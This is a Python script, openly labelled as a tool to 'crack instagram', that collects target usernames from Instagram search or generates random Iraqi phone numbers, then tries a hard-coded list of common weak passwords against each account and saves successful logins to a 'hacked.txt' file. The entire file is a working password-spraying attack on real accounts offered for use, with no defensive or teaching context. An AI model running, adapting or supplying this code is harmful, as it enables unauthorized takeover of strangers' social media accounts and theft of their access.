#coding by KalaRy Chaw Sawz
#tool for crack instagram 
#MY INSTAGRAM KaLaRy F
#python 2.0.1












from InstagramAPI import InstagramAPI
import requests ,os ,time ,datetime ,sys,random
import re

os.system("clear")
def usernameiraq():
    os.system("clear")
    num = '12345678909876534211020546692928174'
    korak = '0750'
    asia = '0770'
    raqamakan =open('1.txt','w')
    for x in range(200):
        x1 = random.choice(num)
        x2 = random.choice(num)
        x3 = random.choice(num)
        x4 = random.choice(num)
        x5 = random.choice(num)
        x6 = random.choice(num)
        x7 = random.choice(num)
        hamwi = korak+x1+x2+x3+x4+x5+x6+x7
        raqamakan.write(hamwi+'\n')
        
 
#usernameiraq()
def usernamee():
    user = input("username :")
    
    url = 'https://www.instagram.com/web/search/topsearch/?query=%{}'.format(user)
    head = {
        
        'User-agent':'Mozilla/5.0 (Linux; Android 9; SM-A102U Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36 Instagram 155.0.0.37.107 Android (28/9; 320dpi; 720x1468; samsung; SM-A102U; a10e; exynos7885; en_US; 239490550'
    }
    respone = requests.get(url,headers=head).text
    
    xxx = re.compile(r'"username":"(.*?)"')
    userfinder = xxx.findall(respone)
    filer = open('1.txt','w')
    for i in userfinder:
        filer.write(i+"\n")

def chek():
    os.system("clear")
    user = open('1.txt','r').readlines()
    password = '1122334455'
    pa2 = '11223344'
    pa3 = '1234512345'
    pa4 = '12344321'
    pa5 = '1234554321'
    pa8 = 'Anianiani12'

    pa7 = '987654321'
    hacked = open("hacked.txt","w")
    hack = 0
    nohack = 0
    acc = 0
    pp = '121.136.153.93:8080'
    for x in user:
        pa6 = x
        api = InstagramAPI(x,password)

        if (api.login()):
            os.system("clear")
            
            print("CRACKED PLEAS WAIT")
            print("HACK :{}".format(hack))
            print("NOT HACK :{}".format(nohack))
            print(x+"\n"+password)
            hack+=1
            hacked.write('username :' +x+"password :"+password)
        
        

        else:
           
            
            os.system("clear")
            print("CRACKED PLEAS WAIT")
            print("HACK :{}".format(hack))
            print("NOT HACK :{}".format(nohack))
            nohack+=1
        apii = InstagramAPI(x,pa2)

        if (apii.login()):
            os.system("clear")
            
            print("CRACKED PLEAS WAIT")
            print("HACK :{}".format(hack))
            print("NOT HACK :{}".format(nohack))
            print(x+"\n"+password)
            hack+=1
            hacked.write('username :'+x+'password :'+pa2)
        else:
            os.system("clear")
            print("CRACKED PLEAS WAIT")
            print("HACK :{}".format(hack))
            print("NOT HACK :{}".format(nohack))
            nohack+=1
        apiii = InstagramAPI(x,pa3)

        if (apiii.login()):
            os.system("clear")
            
            print("CRACKED PLEAS WAIT")
            print("HACK :{}".format(hack))
            print("NOT HACK :{}".format(nohack))
            print(x+"\n"+password)
            hack+=1
            hacked.write('username :'+x+'password :'+pa3)
        
        else:
            os.system("clear")
            print("CRACKED PLEAS WAIT")
            print("HACK :{}".format(hack))
            print("NOT HACK :{}".format(nohack))
            nohack+=1
        apiiii = InstagramAPI(x,pa4)

        if (apiiii.login()):
            os.system("clear")
            
            print("CRACKED PLEAS WAIT")
            print("HACK :{}".format(hack))
            print("NOT HACK :{}".format(nohack))
            print(x+"\n"+password)
            hack+=1
            hacked.write('username :'+x+'password :'+pa4)
        else:
            os.system("clear")
            print("CRACKED PLEAS WAIT")
            print("HACK :{}".format(hack))
            print("NOT HACK :{}".format(nohack))
            nohack+=1
        apiiiii= InstagramAPI(x,pa5)

        if (apiiiii.login()):
            os.system("clear")
            
            print("CRACKED PLEAS WAIT")
            print("HACK :{}".format(hack))
            print("NOT HACK :{}".format(nohack))
            print(x+"\n"+password)
            hack+=1
            hacked.write('username :'+x+'password :'+pa5)
        else:
            os.system("clear")
            print("CRACKED PLEAS WAIT")
            print("HACK :{}".format(hack))
            print("NOT HACK :{}".format(nohack))
            nohack+=1
        apiiiiii= InstagramAPI(x,pa6)

        if (apiiiiii.login()):
            os.system("clear")
            
            print("CRACKED PLEAS WAIT")
            print("HACK :{}".format(hack))
            print("NOT HACK :{}".format(nohack))
            print(x+"\n"+password)
            hack+=1
            hacked.write('username :'+x+'password :'+pa6)
        else:

            os.system("clear")
            print("CRACKED PLEAS WAIT")
            print("HACK :{}".format(hack))
            print("NOT HACK :{}".format(nohack))
            nohack+=1
            time.sleep(4)
        apiiiiiii= InstagramAPI(x,pa7)


        if (apiiiiiii.login()):
            os.system("clear")
            
            print("CRACKED PLEAS WAIT")
            print("HACK :{}".format(hack))
            print("NOT HACK :{}".format(nohack))
            print(x+"\n"+password)
            hack+=1
            hacked.write('username :'+x+'password :'+pa7)
        else:
            os.system("clear")
            print("CRACKED PLEAS WAIT")
            print("HACK :{}".format(hack))
            print("NOT HACK :{}".format(nohack))
            nohack+=1
            time.sleep(2)
        apiiiiiiii= InstagramAPI(x,pa8)

        if (apiiiiiiii.login()):
            os.system("clear")
            
            print("CRACKED PLEAS WAIT")
            print("HACK :{}".format(hack))
            print("NOT HACK :{}".format(nohack))
            print(x+"\n"+password)
            hack+=1
            hacked.write('username :'+x+'password :'+pa8)
        else:
            os.system("clear")
            print("CRACKED PLEAS WAIT")
            print("HACK :{}".format(hack))
            print("NOT HACK :{}".format(nohack))
            nohack+=1
            time.sleep(2)
        
   
def minu():
    os.system("clear")
    logo ='''
██╗  ██╗ █████╗ ██╗      █████╗ ██████╗ ██╗   ██╗
██║ ██╔╝██╔══██╗██║     ██╔══██╗██╔══██╗╚██╗ ██╔╝
█████╔╝ ███████║██║     ███████║██████╔╝ ╚████╔╝
██╔═██╗ ██╔══██║██║     ██╔══██║██╔══██╗  ╚██╔╝
██║  ██╗██║  ██║███████╗██║  ██║██║  ██║   ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝crack instagram         


---------------------------------
    '''
    print(logo)
    print(" [ 1 ] DUMP USERNAME ")
    print(" [ 2 ] DUMP PHONE ")
    print(" [ 3 ] CRACK ")
    print(" [ 0 ] EXIT TOOL ")
    a = int(input("\nChoice :"))
    if a ==1:
        os.system("clear")
        usernamee()
        time.sleep(3)
        minu()
    if a ==2:
        os.system("clear")
        usernameiraq()
        time.sleep(3)
        minu()
    if a ==3:
        os.system("clear")
        chek()
        time.sleep(3)
        os.system("DONE CRACK !!")
        time.sleep(3)
        minu()
    if a==0:
        exit()
minu()